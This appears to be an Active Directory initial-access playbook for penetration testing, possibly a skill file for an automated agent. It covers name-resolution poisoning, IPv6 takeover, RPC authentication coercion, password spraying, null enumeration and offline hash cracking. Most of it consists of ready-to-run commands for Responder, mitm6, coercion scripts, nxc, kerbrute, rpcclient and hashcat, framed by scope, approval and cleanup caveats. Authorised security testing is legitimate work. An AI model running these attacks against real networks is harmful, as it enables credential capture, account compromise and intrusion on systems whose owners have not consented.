# AD initial-access reference (unauth → first credential)
# Internal, approval-gated. Prefer passive capture; policy-first spraying; crack offline; redact; stop + clean up.

## 1. Name-resolution poisoning (passive capture)
When LLMNR / NBT-NS / mDNS are enabled, a responder-class listener answers broadcast name lookups and a
client that mistypes a share authenticates to you, yielding a **NetNTLMv2** hash (crack offline, `-m 5600`).
This is passive (you only answer queries the network already broadcasts) — keep it time-boxed and stop
promptly. Relaying the authentication (instead of cracking) is possible where SMB signing is off, but that
is the lateral-movement skill's territory and is approval-gated; here, prefer capture→offline-crack.

## 2. IPv6 takeover
On dual-stack networks with no DHCPv6, a rogue DHCPv6 responder (`mitm6`) can become the clients' DNS and
collect authentication similarly. Highly intrusive — time-box tightly, in-scope only, with approval.

## 3. Authentication coercion
Certain MS-RPC methods can be invoked to make a host authenticate to a target of your choosing. Point the
coerced authentication at an in-scope listener to capture/relay it. Unauthenticated variants exist (patched
as specific CVEs). Use only in scope and non-disruptively.

## 4. Password spraying (policy FIRST)
Read the domain lockout/password policy before spraying (`--pass-pol`). Spray ONE password across the user
list, spaced out over time, staying well under the lockout threshold — never iterate many passwords per
user. `nxc`/`kerbrute` support this. Seed the password from the policy (season+year+symbol patterns, company
name) and a tiny known-weak set. Stop on the first hit.

## 5. Anonymous / null enumeration
Null or anonymous SMB/LDAP sessions often yield the user list, password policy, and descriptions (which
sometimes contain passwords). `nxc smb <dc> -u '' -p ''`, `rpcclient -U "" -N`, `ldapsearch -x`. A user list
feeds spraying; `kerbrute userenum` validates users without auth.

## 6. Proof + hygiene
Benign proof = a captured NetNTLMv2 cracked OFFLINE to a test/weak account, OR a spray hit confirmed with a
single benign login. **Redact** every hash/credential to a fingerprint. Stop all poisoning/rogue services
and record teardown in `cleanup.md`. Hand the first valid credential to `ad-context` to begin internal
enumeration.

---
## Extended arsenal — passive name-resolution capture (analyze first)
Placeholders: `<d>`=domain `<u>`/`<p>`=creds `<dc>`=DC `<iface>`=NIC `<ip>`=your in-scope listener `<t>`=target.
```
# ANALYZE / passive FIRST — observe which name-resolution queries the network already broadcasts; answer
# NOTHING yet. This is read-only visibility, safe to run while you assess blast radius.
responder -I <iface> -A                 # -A = analyze only: logs LLMNR/NBT-NS/mDNS/BROWSER, poisons nothing
# Before enabling answers, turn OFF every rogue auth server you don't need for the capture — minimise what
# you offer. Keep SMB/HTTP (for the NetNTLM capture); DISABLE until approved: DNS, WPAD/Proxy-Auth, LDAP,
# SQL, FTP, SMTP, POP/IMAP, Kerberos, RDP, DCE-RPC. (Set these to Off in the responder config / flags.)
# Approved, time-boxed active capture — a mistyped share makes a client authenticate to you:
responder -I <iface> -dw               # answers queries; captured hash is NetNTLMv2 -> crack OFFLINE (-m 5600)
#   -d/-w flags: answer DHCP / WPAD only if those are explicitly in scope; otherwise omit them.
# STOP promptly, record teardown. Relaying the captured auth (SMB signing off) is the LATERAL-MOVEMENT
# skill's job and is approval-gated — here it is capture -> OFFLINE crack ONLY.
```

---
## Extended arsenal — IPv6 / DHCPv6 takeover (capture-first scoping)
```
# Highly intrusive (you become the clients' DNS). Run TIGHTLY scoped, time-boxed to minutes, watch impact.
mitm6 -d <d> -i <iface> --ignore-nofqdn      # restrict the attack to the in-scope AD domain only
#   further shrink blast radius with mitm6's host allow/deny-list flags -> reply only to approved hosts
# LDAP / relay caveat — CAPTURE-FIRST here. The classic chain pairs mitm6 with a relay to LDAP/LDAPS on the
# DC (WPAD-triggered auth -> add a computer / set RBCD). That relay is APPROVAL-GATED lateral movement and
# is catalogued-not-fired in this skill. Here you stop at: prove the spoof works + capture auth for an
# OFFLINE crack. Teardown the DHCPv6 responder immediately after the window.
```

---
## Extended arsenal — authentication coercion -> in-scope capture listener
```
# Invoke an MS-RPC method so an in-scope host authenticates to YOUR capture listener (<ip>); then crack the
# captured NetNTLMv2 OFFLINE. Non-disruptive, in-scope target only. Relaying = lateral-movement (gated).
printerbug.py '<d>/<u>:<p>'@<t> <ip>                  # MS-RPRN  (PrinterBug)
petitpotam.py -u <u> -p <p> -d <d> <ip> <t>           # MS-EFSR  (unauth variants exist as specific CVEs)
dfscoerce.py  -u <u> -p <p> -d <d> <ip> <t>           # MS-DFSNM
shadowcoerce.py -u <u> -p <p> -d <d> <ip> <t>         # MS-FSRVP
coercer coerce -u <u> -p <p> -d <d> -t <t> -l <ip>    # multi-method: auto-tries many RPC coercion methods
# Benign path: capture at <ip> -> offline crack (-m 5600) -> ONE confirmed credential. Note which methods
# the target answers (and any unauth variant) as the exposure; do not fire destructively.
```

---
## Extended arsenal — policy-first password spraying (one-liners)
```
# 1) READ the policy FIRST — never spray blind:
nxc smb <dc> -u <u> -p <p> --pass-pol        # lockout threshold / observation window / min length / history
nxc smb <dc> -u '' -p '' --pass-pol          # often readable via a null session too
# 2) Spray ONE password across the user list (ONE attempt per user = lockout-safe); take the FIRST hit, STOP:
nxc smb  <dc> -u users.txt -p '<OneSeasonalGuess>'      # SMB path
nxc ldap <dc> -u users.txt -p '<OneGuess>'              # LDAP-bind path (sidesteps some SMB lockout quirks)
kerbrute passwordspray -d <d> --dc <dc> users.txt '<OneGuess>'   # Kerberos pre-auth path
# NEVER iterate many passwords per user. Seed the ONE guess from the policy (Season+Year+symbol, Company+n)
# plus a tiny known-weak set. Space successive rounds across the lockout WINDOW. Confirm a hit with ONE
# benign login, then stop spraying.
```

---
## Extended arsenal — anonymous / null enumeration (one-liners)
```
nxc smb  <dc> -u '' -p ''                               # null session
nxc smb  <dc> -u 'guest' -p ''                          # anonymous / guest
nxc smb  <dc> -u '' -p '' --users --pass-pol --shares   # user list + policy + shares in one pass
nxc smb  <dc> -u '' -p '' --rid-brute 10000             # RID-cycling users when enumdomusers is blocked
rpcclient -U '' -N <dc> -c 'enumdomusers;querydominfo;getdompwinfo'
ldapsearch -x -H ldap://<dc> -b '<base_dn>' '(objectClass=user)' sAMAccountName description
nxc ldap <dc> -u '' -p '' -M get-desc-users             # user descriptions — may hold passwords
# If a description/attribute contains a credential, REDACT it to a fingerprint (len+prefix) immediately.
```

---
## Extended arsenal — user validation without lockout (kerbrute userenum)
```
kerbrute userenum -d <d> --dc <dc> users.txt           # which names exist, via Kerberos pre-auth probing
# No bind and no password attempt = NO lockout risk. Use it to trim a spray list to REAL accounts first.
# Seed users.txt from null-enum / RID-brute / OSINT (first.last, flast, f.last patterns).
```

---
## Extended arsenal — ADIDNS & unauth quick-wins (awareness)
```
# ADIDNS: authenticated (often ANY) domain accounts can add DNS records. A record pointing at your host can
# steer name lookups to you as a capture aid. AWARENESS-level here; adding records is active + gated — just
# NOTE whether the zone permits it.
# Other unauth quick-wins to NOTE (catalogue, don't fire blind):
#   - pre-created computer accounts whose password == account name (lowercase) -> ONE benign check only
#   - blank / weak service or machine creds surfaced in null-readable attributes -> REDACT if found
#   - very old DCs with pre-auth / ticket CVEs -> record the CVE + patch state; do not exploit here
```

---
## Extended arsenal — NetNTLM downgrade & offline crack modes
```
# NetNTLMv1 downgrade: where legacy auth is permitted, a captured response may be NetNTLMv1 — far weaker,
# and (with a known/fixed challenge) recoverable to the NT hash cheaply. The downgrade being ALLOWED is the
# finding; capturing/forcing it on production is approval-gated — note if a host answers v1, don't force it.
# Offline crack-mode reminders (crack is OFFLINE, on material you're authorized to hold; then redact+delete):
#   NetNTLMv2  -> hashcat -m 5600   (john: netntlmv2)
#   NetNTLMv1  -> hashcat -m 5500   (john: netntlm)      # weak — flag the downgrade itself
```
